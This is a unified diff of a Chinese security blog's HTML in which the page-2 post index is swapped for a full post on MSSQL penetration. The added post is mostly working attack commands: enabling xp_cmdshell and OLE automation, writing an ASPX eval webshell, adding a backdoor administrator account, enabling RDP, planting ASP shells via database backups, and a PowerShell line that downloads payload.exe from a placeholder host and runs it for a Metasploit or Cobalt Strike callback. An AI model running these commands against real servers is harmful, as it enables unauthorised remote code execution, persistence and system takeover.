@@ -6,14 +6,19 @@
   <meta name="renderer" content="webkit">
   <meta http-equiv="X-UA-Compatible" content="IE=edge" >
   <link rel="dns-prefetch" href="http://example.com">
-  <title>不过是块石头而已</title>
+  <title>mssql渗透相关 | 不过是块石头而已</title>
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
-  <meta property="og:type" content="website">
-<meta property="og:title" content="不过是块石头而已">
-<meta property="og:url" content="http://example.com/page/2/index.html">
+  <meta name="description" content="mssql渗透相关   简单查询命令 select @@VERSION         #查看数据库版本 select @@servername      #查看服务器主机信息 select db_name()         #查看当前数据库名称 select user              #查看当前用户 SP_HELPUSER              #查看用户相关信息   SP_HE">
+<meta property="og:type" content="article">
+<meta property="og:title" content="mssql渗透相关">
+<meta property="og:url" content="http://example.com/2022/04/05/mssql%E6%B8%97%E9%80%8F%E7%9B%B8%E5%85%B3/index.html">
 <meta property="og:site_name" content="不过是块石头而已">
+<meta property="og:description" content="mssql渗透相关   简单查询命令 select @@VERSION         #查看数据库版本 select @@servername      #查看服务器主机信息 select db_name()         #查看当前数据库名称 select user              #查看当前用户 SP_HELPUSER              #查看用户相关信息   SP_HE">
 <meta property="og:locale" content="en_US">
+<meta property="article:published_time" content="2022-04-05T05:47:17.000Z">
+<meta property="article:modified_time" content="2022-05-12T06:23:11.354Z">
 <meta property="article:author" content="lam">
+<meta property="article:tag" content="渗透">
 <meta name="twitter:card" content="summary">
   
     <link rel="alternative" href="/atom.xml" title="不过是块石头而已" type="application/atom+xml">
@@ -132,189 +137,212 @@
             <canvas data-colors="#eaeaea" data-sectionHeight="100" data-contentId="js-content" id="myCanvas1" class="anm-canvas"></canvas>
           </div>
           <div id="js-content" class="content-ll">
-            
-  
-    <article id="post-Mimikatz原理和使用" class="article article-type-post  article-index" itemscope itemprop="blogPost">
+            <article id="post-mssql渗透相关" class="article article-type-post " itemscope itemprop="blogPost">
   <div class="article-inner">
     
       <header class="article-header">
         
   
-    <h1 itemprop="name">
-      <a class="article-title" href="/2022/01/25/Mimikatz%E5%8E%9F%E7%90%86%E5%92%8C%E4%BD%BF%E7%94%A8/">Mimikatz原理和使用</a>
+    <h1 class="article-title" itemprop="name">
+      mssql渗透相关
     </h1>
   
 
         
-        <a href="/2022/01/25/Mimikatz%E5%8E%9F%E7%90%86%E5%92%8C%E4%BD%BF%E7%94%A8/" class="archive-article-date">
-  	<time datetime="2022-01-25T06:33:52.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2022-01-25</time>
+        <a href="/2022/04/05/mssql%E6%B8%97%E9%80%8F%E7%9B%B8%E5%85%B3/" class="archive-article-date">
+  	<time datetime="2022-04-05T05:47:17.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2022-04-05</time>
 </a>
         
       </header>
     
     <div class="article-entry" itemprop="articleBody">
       
-        <h3 id="Mimikatz使用手册"><a href="#Mimikatz使用手册" class="headerlink" title="Mimikatz使用手册"></a>Mimikatz使用手册</h3><pre><code>原理：
+        <p>mssql渗透相关</p>
+<!---MORE-->
 
-    当用户登陆后,会把账号密码保存在 lsass中，lsass是微软 Windows系统的安全机制它主要用于本地安全和登陆策略，通常我们在登陆系统时输入密码之后，密码便会储存在lsass内存中，经过其 Wdigest和 tspg两个模块调用后，对其使用可逆的算法进行加密并存储在内存之中，而mimikatz正是通过对lsass的逆算获取到明文密码
+<p>简单查询命令</p>
+<pre><code>select @@VERSION         #查看数据库版本
+select @@servername      #查看服务器主机信息
+select db_name()         #查看当前数据库名称
+select user              #查看当前用户
+SP_HELPUSER              #查看用户相关信息  
+SP_HELPROLE              #查看服务器角色相关信息  
+select IS_SRVROLEMEMBER  #查看数据库权限
+
+select is_srvrolemember(&#39;sysadmin&#39;) # 判断是否是SA权限
+select is_member(&#39;db_owner&#39;)        # 判断是否是db_owner权限  
+select is_srvrolemember(&#39;public&#39;)   # 判断是否是public权限
+
+#获取MSSQL中的所有数据库名  
+SELECT name FROM MASter..SysDatabASes ORDER BY name   
+#查询所有数据库中的表名
+SELECT SysObjects.name AS Tablename FROM sysobjects WHERE xtype = &#39;U&#39; and sysstat&lt;200
+
+exec xp_getnetname    #获取服务器名称
+exec xp_msver	      #获取服务器信息
+exec xp_fixeddrives   #获取磁盘空间信息
+
 </code></pre>
-        
-          <a class="article-more-a" href="/2022/01/25/Mimikatz%E5%8E%9F%E7%90%86%E5%92%8C%E4%BD%BF%E7%94%A8/#more">more >></a>
-        
+<h4 id="一、sa用户-system权限"><a href="#一、sa用户-system权限" class="headerlink" title="一、sa用户 + system权限"></a>一、sa用户 + system权限</h4><p>mssql数据库的DBA用户名为 sa ，一般拥有 SYSTEM 权限，且默认允许远程登录。</p>
+<p>假设已通过弱口令或web配置文件拿到 sa 用户的密码。</p>
+<p>则可以直接通过 ssms 或 DBeaver 远程登录，并通过以下几种方式执行命令：</p>
+<h5 id="1-xp-cmdshell"><a href="#1-xp-cmdshell" class="headerlink" title="1. xp_cmdshell"></a>1. xp_cmdshell</h5><p>xp_cmdshell默认在mssql2000中是开启的，在mssql2005之后默认禁止，但未删除</p>
+<p>查看xp_cmdshell状态</p>
+<pre><code>select count(*) from master.dbo.sysobjects where xtype=&#39;x&#39; and name=&#39;xp_cmdshell&#39;
+</code></pre>
+<p>开启xp_cmdshell组件</p>
+<pre><code>EXEC sp_configure &#39;show advanced options&#39;, 1
+RECONFIGURE
+EXEC sp_configure &#39;xp_cmdshell&#39;,1    #此处改为0即关闭
+RECONFIGURE
+</code></pre>
+<p>xp_cmdshell存储过程被删除的情况下重新添加</p>
+<pre><code>EXEC sp_addextendedproc xp_cmdshell,@dllname =&#39;xplog70.dll&#39;declare @o int;
+sp_addextendedproc &#39;xp_cmdshell&#39;, &#39;xpsql70.dll&#39;;
+</code></pre>
+<p>执行命令</p>
+<pre><code>exec xp_cmdshell &quot;whoami&quot;
+master..xp_cmdshell &#39;whoami&#39;    #(2008版上好像用不了)
+EXEC master..xp_cmdshell &quot;whoami&quot;
+EXEC master.dbo.xp_cmdshell &quot;ipconfig&quot;
+</code></pre>
+<p>查询操作系统和版本信息</p>
+<pre><code>exec master..xp_cmdshell &#39;systeminfo | findstr /B /C:&quot;OS Name&quot; /C:&quot;OS Version&quot;&#39;
+exec master..xp_cmdshell &#39;systeminfo | findstr /B /C:&quot;OS 名称&quot; /C:&quot;OS 版本&quot;&#39;
+</code></pre>
+<p>写webshell</p>
+<pre><code>exec master..xp_cmdshell &#39;echo ^&lt;%@ Page Language=&quot;Jscript&quot;%^&gt;^&lt;%eval(Request.Item[&quot;pass&quot;],&quot;unsafe&quot;);%^&gt; &gt; c:\\inetpub\\wwwroot\\x.aspx&#39;
+</code></pre>
+<p>创建用户并加入管理员组</p>
+<pre><code>exec master..xp_cmdshell &quot;net user hack admin!@#45 /add&quot;
+exec master..xp_cmdshell &quot;net localgroup administrators hack /add&quot;
+exec master..xp_cmdshell &quot;net user hack&quot;
+</code></pre>
+<p>开启远程桌面</p>
+<pre><code>#查询是否开启远程桌面 (0表示开启，1表示关闭)
+EXEC master..xp_regread &#39;HKEY_LOCAL_MACHINE&#39;,
+&#39;SYSTEM\CurrentControlSet\Control\Terminal Server&#39;,
+&#39;fDenyTSConnections&#39;
+
+#判断远程桌面RDP端口
+EXEC master..xp_cmdshell &#39;reg query HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal&quot; &quot;Server\WinStations\RDP-Tcp /v PortNumber&#39;
+
+#开启远程桌面
+EXEC master.dbo.xp_regwrite&#39;HKEY_LOCAL_MACHINE&#39;,
+&#39;SYSTEM\CurrentControlSet\Control\TerminalServer&#39;,
+&#39;fDenyTSConnections&#39;,&#39;REG_DWORD&#39;,0;
+</code></pre>
+<h5 id="2-sp-oacreate"><a href="#2-sp-oacreate" class="headerlink" title="2. sp_oacreate"></a>2. sp_oacreate</h5><p><code>sp_oacreate</code> 系统存储过程可以用于对文件删除、复制、移动等操作，还可以配合 <code>sp_oamethod</code> 系统存储过程调用系统 <code>wscript.shell</code> 来执行系统命令。</p>
+<p><code>sp_oacreate</code> 和 <code>sp_oamethod</code> 两个过程分别用来创建和执行脚本语言。</p>
+<p>查看 sp_oacreate 状态</p>
+<pre><code>#返回1表示存在 sp_oacreate 系统存储过程
+select count(*) from master.dbo.sysobjects where xtype=&#39;x&#39; and name=&#39;SP_OACREATE&#39;;
+</code></pre>
+<p>启用OLE Automation Procedures选项</p>
+<pre><code>exec sp_configure &#39;show advanced options&#39;,1;
+reconfigure;
+exec sp_configure &#39;Ole Automation Procedures&#39;,1;
+reconfigure;
+</code></pre>
+<p>利用 sp_oacreate 和 sp_oamethod 执行命令</p>
+<pre><code>#回显0表示命令执行成功
+declare @shell int exec sp_oacreate &#39;wscript.shell&#39;,@shell output 
+exec sp_oamethod @shell,&#39;run&#39;,null,&#39;c:\windows\system32\cmd.exe /c whoami &gt;c:\\whoami.txt&#39;;
+</code></pre>
+<p>贴常用的一些危险的存储过程，可自查存储过程的功能和用法：</p>
+<pre><code>xp_cmdshell
+xp_dirtree
+xp_enumgroups
+xp_fixeddrives
+xp_loginconfig
+xp_enumerrorlogs
+xp_getfiledetails
+Sp_OACreate
+Sp_OADestroy
+Sp_OAGetErrorInfo
+Sp_OAGetProperty
+Sp_OAMethod
+Sp_OASetProperty
+Sp_OAStop
+Xp_regaddmultistring
+Xp_regdeletekey
+Xp_regdeletevalue
+Xp_regenumvalues
+Xp_regread
+Xp_regremovemultistring
+Xp_regwrite
+sp_makewebtask
+</code></pre>
+<h5 id="3-沙盒"><a href="#3-沙盒" class="headerlink" title="3. 沙盒"></a>3. 沙盒</h5><p>沙盒提权的原理就是<code>jet.oledb</code>（修改注册表）执行系统命令。数据库通过查询方式调用<code>mdb</code>文件，执行参数，绕过系统本身自己的执行命令，实现<code>mdb</code>文件执行命令。</p>
+<p>测试 <code>jet.oledb</code> 是否能用</p>
+<pre><code>select * from openrowset(&#39;microsoft.jet.oledb.4.0&#39;,&#39;;database=c:\windows\system32\ias\ias.mdb&#39;,&#39;select shell(&quot;cmd.exe /c whoami&quot;)&#39;)
+</code></pre>
+<p>开启Ad Hoc Distributed Queries组件</p>
+<pre><code>exec sp_configure &#39;show advanced options&#39;,1 ;
+reconfigure ;
+exec sp_configure &#39;Ad Hoc Distributed Queries&#39;,1 ;
+reconfigure;
+</code></pre>
+<p>关闭沙盒模式</p>
+<pre><code>exec master..xp_regwrite &#39;HKEY_LOCAL_MACHINE&#39;,&#39;SOFTWARE\Microsoft\Jet\4.0\Engines&#39;,&#39;SandBoxMode&#39;,&#39;REG_DWORD&#39;,0;
+</code></pre>
+<p>查看命令</p>
+<pre><code>exec master.dbo.xp_regread &#39;HKEY_LOCAL_MACHINE&#39;,&#39;SOFTWARE\Microsoft\Jet\4.0\Engines&#39;, &#39;SandBoxMode&#39;
+</code></pre>
+<p>执行命令</p>
+<pre><code>Select * From OpenRowSet(&#39;Microsoft.Jet.OLEDB.4.0&#39;,&#39;;Database=c:\windows\system32\ias\ias.mdb&#39;,&#39;select shell(&quot;cmd.exe /c whoami &gt;c:\\whoami.txt &quot;)&#39;);
+</code></pre>
+<h5 id="4-差异备份拿shell"><a href="#4-差异备份拿shell" class="headerlink" title="4. 差异备份拿shell"></a>4. 差异备份拿shell</h5><pre><code>backup database 库名 to disk = &#39;c:\bak.bak&#39;;--
+
+create table [dbo].[test] ([cmd] [image]);
+
+insert into test(cmd) values(0x3C25657865637574652872657175657374282261222929253E)
+
+backup database 库名 to disk=&#39;C:\d.asp&#39; WITH DIFFERENTIAL,FORMAT;--
+</code></pre>
+<p>因为权限的问题，最好不要备份到盘符根目录</p>
+<p>当过滤了特殊的字符比如单引号，或者 路径符号 都可以使用定义局部变量来执行。</p>
+<h5 id="5-log备份拿shell"><a href="#5-log备份拿shell" class="headerlink" title="5. log备份拿shell"></a>5. log备份拿shell</h5><p>LOG备份的要求是他的数据库备份过，而且选择恢复模式得是完整模式，至少在2008上是这样的，但是使用log备份文件会小的多，当然如果权限够高可以设置他的恢复模式。</p>
+<pre><code>alter database 库名 set RECOVERY FULL 
+
+create table cmd (a image) 
+
+backup log 库名 to disk = &#39;c:\xxx&#39; with init 
+
+insert into cmd (a) values (0x3C25657865637574652872657175657374282261222929253E) 
+
+backup log 库名 to disk = &#39;c:\xxx\2.asp&#39;
+</code></pre>
+<h4 id="二、降权sa用户-无web访问权限"><a href="#二、降权sa用户-无web访问权限" class="headerlink" title="二、降权sa用户 + 无web访问权限"></a>二、降权sa用户 + 无web访问权限</h4><p>当然，拿到 sa 用户也有可能是被降权后的。权限是 <code>service\mssqlserver</code> 权限。</p>
+<p>假设通过弱口令拿到了被降权的 sa 用户或其他具有dbo权限的用户。<code>xp_cmdshell</code> 仍然可用，但由于权限问题无法向web路径写入webshell。</p>
+<p>此时上面几种方法几乎全部失效，经测试，可以通过<code>xp_cmdshell</code>调用powershell进而下载exe木马文件后并执行，来实现msf或cs上线。</p>
+<pre><code>exec master..xp_cmdshell &#39;&quot;echo $client = New-Object System.Net.WebClient &gt; %TEMP%\test.ps1 &amp; echo $client.DownloadFile(&quot;http://x.x.x.x/payload.exe&quot;,&quot;%TEMP%\payload.exe&quot;) &gt;&gt; %TEMP%\test.ps1 &amp; powershell  -ExecutionPolicy Bypass  %temp%\test.ps1 &amp; WMIC process call create &quot;%TEMP%\payload.exe&quot;&quot;&#39;
+</code></pre>
+<p>成功通过降权sa用户拿到shell，可进一步通过msf或cs进行提权测试。</p>
+
       
 
       
-    </div>
-    <div class="article-info article-info-index">
-      
-      
-	<div class="article-tag tagcloud">
-		<i class="icon-price-tags icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color3">工具</a>
-        		</li>
-      		
-		</ul>
-	</div>
-
-      
-
-      
-        <p class="article-more-link">
-          <a class="article-more-a" href="/2022/01/25/Mimikatz%E5%8E%9F%E7%90%86%E5%92%8C%E4%BD%BF%E7%94%A8/">展开全文 >></a>
-        </p>
-      
-
-      
-      <div class="clearfix"></div>
-    </div>
-  </div>
-</article>
-
-<aside class="wrap-side-operation">
-    <div class="mod-side-operation">
-        
-        <div class="jump-container" id="js-jump-container" style="display:none;">
-            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
-                <i class="icon-font icon-back"></i>
-            </a>
-            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
-                <i class="icon-font icon-plane jump-plane"></i>
-            </div>
+        <div class="page-reward">
+          <a href="javascript:;" class="page-reward-btn tooltip-top">
+            <div class="tooltip tooltip-east">
+            <span class="tooltip-item">
+              赏
+            </span>
+            <span class="tooltip-content">
+              <span class="tooltip-text">
+                <span class="tooltip-inner">
+                  <p class="reward-p"><i class="icon icon-quo-left"></i>谢谢你请我吃糖果<i class="icon icon-quo-right"></i></p>
+                  <div class="reward-box">
+                    
+                    
+                  </div>
+                </span>
+              </span>
+            </span>
+          </div>
+          </a>
         </div>
-        
-        
-    </div>
-</aside>
-
-
-
-
-  
-    <article id="post-内网渗透" class="article article-type-post  article-index" itemscope itemprop="blogPost">
-  <div class="article-inner">
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2022/01/10/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/">内网渗透</a>
-    </h1>
-  
-
-        
-        <a href="/2022/01/10/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/" class="archive-article-date">
-  	<time datetime="2022-01-10T05:41:56.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2022-01-10</time>
-</a>
-        
-      </header>
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <h1 id="内网渗透"><a href="#内网渗透" class="headerlink" title="内网渗透"></a>内网渗透</h1><p>《内网安全攻防——渗透测试实战指南》笔记</p>
-        
-          <a class="article-more-a" href="/2022/01/10/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/#more">more >></a>
-        
-      
-
-      
-    </div>
-    <div class="article-info article-info-index">
-      
-      
-	<div class="article-tag tagcloud">
-		<i class="icon-price-tags icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color3">内网</a>
-        		</li>
-      		
-		</ul>
-	</div>
-
-      
-
-      
-        <p class="article-more-link">
-          <a class="article-more-a" href="/2022/01/10/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/">展开全文 >></a>
-        </p>
-      
-
-      
-      <div class="clearfix"></div>
-    </div>
-  </div>
-</article>
-
-<aside class="wrap-side-operation">
-    <div class="mod-side-operation">
-        
-        <div class="jump-container" id="js-jump-container" style="display:none;">
-            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
-                <i class="icon-font icon-back"></i>
-            </a>
-            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
-                <i class="icon-font icon-plane jump-plane"></i>
-            </div>
-        </div>
-        
-        
-    </div>
-</aside>
-
-
-
-
-  
-    <article id="post-MySQL渗透相关" class="article article-type-post  article-index" itemscope itemprop="blogPost">
-  <div class="article-inner">
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2021/08/15/MySQL%E6%B8%97%E9%80%8F%E7%9B%B8%E5%85%B3/">MySQL渗透相关</a>
-    </h1>
-  
-
-        
-        <a href="/2021/08/15/MySQL%E6%B8%97%E9%80%8F%E7%9B%B8%E5%85%B3/" class="archive-article-date">
-  	<time datetime="2021-08-15T06:20:57.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2021-08-15</time>
-</a>
-        
-      </header>
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <h3 id="Mysql渗透相关"><a href="#Mysql渗透相关" class="headerlink" title="Mysql渗透相关"></a>Mysql渗透相关</h3><p>Mysql相关</p>
-        
-          <a class="article-more-a" href="/2021/08/15/MySQL%E6%B8%97%E9%80%8F%E7%9B%B8%E5%85%B3/#more">more >></a>
-        
-      
-
       
     </div>
     <div class="article-info article-info-index">
@@ -334,16 +362,84 @@
       
 
       
-        <p class="article-more-link">
-          <a class="article-more-a" href="/2021/08/15/MySQL%E6%B8%97%E9%80%8F%E7%9B%B8%E5%85%B3/">展开全文 >></a>
-        </p>
-      
 
+      
+        
+<div class="share-btn share-icons tooltip-left">
+  <div class="tooltip tooltip-east">
+    <span class="tooltip-item">
+      <a href="javascript:;" class="share-sns share-outer">
+        <i class="icon icon-share"></i>
+      </a>
+    </span>
+    <span class="tooltip-content">
+      <div class="share-wrap">
+        <div class="share-icons">
+          <a class="weibo share-sns" href="javascript:;" data-type="weibo">
+            <i class="icon icon-weibo"></i>
+          </a>
+          <a class="weixin share-sns wxFab" href="javascript:;" data-type="weixin">
+            <i class="icon icon-weixin"></i>
+          </a>
+          <a class="qq share-sns" href="javascript:;" data-type="qq">
+            <i class="icon icon-qq"></i>
+          </a>
+          <a class="douban share-sns" href="javascript:;" data-type="douban">
+            <i class="icon icon-douban"></i>
+          </a>
+          <a class="qzone share-sns" href="javascript:;" data-type="qzone">
+            <i class="icon icon-qzone"></i>
+          </a>
+          <a class="facebook share-sns" href="javascript:;" data-type="facebook">
+            <i class="icon icon-facebook"></i>
+          </a>
+          <a class="twitter share-sns" href="javascript:;" data-type="twitter">
+            <i class="icon icon-twitter"></i>
+          </a>
+          <a class="google share-sns" href="javascript:;" data-type="google">
+            <i class="icon icon-google"></i>
+          </a>
+        </div>
+      </div>
+    </span>
+  </div>
+</div>
+
+<div class="page-modal wx-share js-wx-box">
+    <a class="close js-modal-close" href="javascript:;"><i class="icon icon-close"></i></a>
+    <p>扫一扫，分享到微信</p>
+    <div class="wx-qrcode">
+      <img src="//pan.baidu.com/share/qrcode?url=http://example.com/2022/04/05/mssql%E6%B8%97%E9%80%8F%E7%9B%B8%E5%85%B3/" alt="微信分享二维码">
+    </div>
+</div>
+
+<div class="mask js-mask"></div>
       
       <div class="clearfix"></div>
     </div>
   </div>
 </article>
+
+  
+<nav id="article-nav">
+  
+    <a href="/2022/04/05/Git/" id="article-nav-newer" class="article-nav-link-wrap">
+      <i class="icon-circle-left"></i>
+      <div class="article-nav-title">
+        
+          git使用
+        
+      </div>
+    </a>
+  
+  
+    <a href="/2022/03/15/fastjson%E7%9B%B8%E5%85%B3/" id="article-nav-older" class="article-nav-link-wrap">
+      <div class="article-nav-title">fastjson相关</div>
+      <i class="icon-circle-right"></i>
+    </a>
+  
+</nav>
+
 
 <aside class="wrap-side-operation">
     <div class="mod-side-operation">
@@ -363,258 +459,14 @@
 
 
 
-
-  
-    <article id="post-nmap相关" class="article article-type-post  article-index" itemscope itemprop="blogPost">
-  <div class="article-inner">
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2021/07/14/nmap%E7%9B%B8%E5%85%B3/">nmap相关</a>
-    </h1>
-  
-
-        
-        <a href="/2021/07/14/nmap%E7%9B%B8%E5%85%B3/" class="archive-article-date">
-  	<time datetime="2021-07-14T05:49:54.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2021-07-14</time>
-</a>
-        
-      </header>
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <p>Nmap 使用方法、小技巧</p>
-        
-          <a class="article-more-a" href="/2021/07/14/nmap%E7%9B%B8%E5%85%B3/#more">more >></a>
-        
-      
-
-      
-    </div>
-    <div class="article-info article-info-index">
-      
-      
-	<div class="article-tag tagcloud">
-		<i class="icon-price-tags icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color3">工具</a>
-        		</li>
-      		
-		</ul>
-	</div>
-
-      
-
-      
-        <p class="article-more-link">
-          <a class="article-more-a" href="/2021/07/14/nmap%E7%9B%B8%E5%85%B3/">展开全文 >></a>
-        </p>
-      
-
-      
-      <div class="clearfix"></div>
-    </div>
-  </div>
-</article>
-
-<aside class="wrap-side-operation">
-    <div class="mod-side-operation">
-        
-        <div class="jump-container" id="js-jump-container" style="display:none;">
-            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
-                <i class="icon-font icon-back"></i>
-            </a>
-            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
-                <i class="icon-font icon-plane jump-plane"></i>
-            </div>
-        </div>
-        
-        
-    </div>
-</aside>
-
-
-
-
-  
-    <article id="post-sqli-labs" class="article article-type-post  article-index" itemscope itemprop="blogPost">
-  <div class="article-inner">
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2021/06/09/sqli-labs/">sqli-lab学习</a>
-    </h1>
-  
-
-        
-        <a href="/2021/06/09/sqli-labs/" class="archive-article-date">
-  	<time datetime="2021-06-09T12:58:48.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2021-06-09</time>
-</a>
-        
-      </header>
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <p>vs2022自</p>
-<p>sqli-labs 1-28</p>
-        
-          <a class="article-more-a" href="/2021/06/09/sqli-labs/#more">more >></a>
-        
-      
-
-      
-    </div>
-    <div class="article-info article-info-index">
-      
-      
-	<div class="article-tag tagcloud">
-		<i class="icon-price-tags icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color3">练习</a>
-        		</li>
-      		
-		</ul>
-	</div>
-
-      
-
-      
-        <p class="article-more-link">
-          <a class="article-more-a" href="/2021/06/09/sqli-labs/">展开全文 >></a>
-        </p>
-      
-
-      
-      <div class="clearfix"></div>
-    </div>
-  </div>
-</article>
-
-<aside class="wrap-side-operation">
-    <div class="mod-side-operation">
-        
-        <div class="jump-container" id="js-jump-container" style="display:none;">
-            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
-                <i class="icon-font icon-back"></i>
-            </a>
-            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
-                <i class="icon-font icon-plane jump-plane"></i>
-            </div>
-        </div>
-        
-        
-    </div>
-</aside>
-
-
-
-
-  
-    <article id="post-汇编相关" class="article article-type-post  article-index" itemscope itemprop="blogPost">
-  <div class="article-inner">
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2020/04/29/%E6%B1%87%E7%BC%96%E7%9B%B8%E5%85%B3/">汇编相关</a>
-    </h1>
-  
-
-        
-        <a href="/2020/04/29/%E6%B1%87%E7%BC%96%E7%9B%B8%E5%85%B3/" class="archive-article-date">
-  	<time datetime="2020-04-29T06:41:47.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2020-04-29</time>
-</a>
-        
-      </header>
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <h1 id="汇编"><a href="#汇编" class="headerlink" title="汇编"></a>汇编</h1><pre><code>|-寻址
-|-寄存器*
-|-调用约定**
-</code></pre>
-<h2 id="寻址模式"><a href="#寻址模式" class="headerlink" title="寻址模式"></a>寻址模式</h2><ol>
-<li><p>立即数寻址	     eg.: mov eax,1000h    操作数在指令中</p>
-</li>
-<li><p>寄存器寻址         eg. :mov ebp,esp        操作数在指定寄存器中</p>
-</li>
-<li><p>直接内存寻址     eg.: mov ax,[2000h]    操作数在内存中</p>
-</li>
-<li><p>寄存器间接寻址 eg.: mov eax,[ebx]       操作数在内存中，操作数的地址在寄存器中</p>
-</li>
-<li><p>索引寻址             eg.: mov ax,[di+100h] 通过基址寄存器内容加上一个索引值来寻址内存中的数据</p>
-</li>
-<li><p>相对基址索引寻址eg.: mov dh,[bx+si+10h]  基址寄存器+变址寄存器内容+偏移量</p>
-</li>
-<li><p>比例寻址变址      eg.: mov eax,[ebx+4*ecx]</p>
-        
-          <a class="article-more-a" href="/2020/04/29/%E6%B1%87%E7%BC%96%E7%9B%B8%E5%85%B3/#more">more >></a>
-        
-      
-
-      
-    </div>
-    <div class="article-info article-info-index">
-      
-      
-	<div class="article-tag tagcloud">
-		<i class="icon-price-tags icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color3">逆向</a>
-        		</li>
-      		
-		</ul>
-	</div>
-
-      
-
-      
-        <p class="article-more-link">
-          <a class="article-more-a" href="/2020/04/29/%E6%B1%87%E7%BC%96%E7%9B%B8%E5%85%B3/">展开全文 >></a>
-        </p>
-      
-
-      
-      <div class="clearfix"></div>
-    </div>
-  </div>
-</article>
-
-<aside class="wrap-side-operation">
-    <div class="mod-side-operation">
-        
-        <div class="jump-container" id="js-jump-container" style="display:none;">
-            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
-                <i class="icon-font icon-back"></i>
-            </a>
-            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
-                <i class="icon-font icon-plane jump-plane"></i>
-            </div>
-        </div>
-        
-        
-    </div>
-</aside>
-
-
-
-
   
   
-    <nav id="page-nav">
-      <a class="extend prev" rel="prev" href="/">&amp;laquo; Prev</a><a class="page-number" href="/">1</a><span class="page-number current">2</span>
-    </nav>
+  
+
+  
+
+  
+
   
 
 
@@ -637,8 +489,8 @@
     <script>
 	var yiliaConfig = {
 		mathjax: false,
-		isHome: true,
-		isPost: false,
+		isHome: false,
+		isPost: true,
 		isArchive: false,
 		isTag: false,
 		isCategory: false,
